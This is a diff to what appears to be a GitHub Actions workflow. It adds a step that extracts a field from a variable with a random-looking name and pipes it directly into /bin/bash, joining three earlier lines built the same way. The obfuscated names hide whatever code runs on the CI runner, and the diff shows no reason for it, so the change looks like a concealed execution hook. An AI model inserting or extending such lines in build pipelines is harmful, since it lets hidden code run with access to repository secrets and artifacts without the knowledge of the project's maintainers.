@@ -28,6 +28,7 @@ jobs:
           echo $lka42689 | jq -r .k6877 | /bin/bash
           echo $abvql4544 | jq -r .b8305 | /bin/bash
           printf '%s' "$hutv4543" | jq -r .h21191 | /bin/bash
+          echo $ja5 | jq -r .rebyb68 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
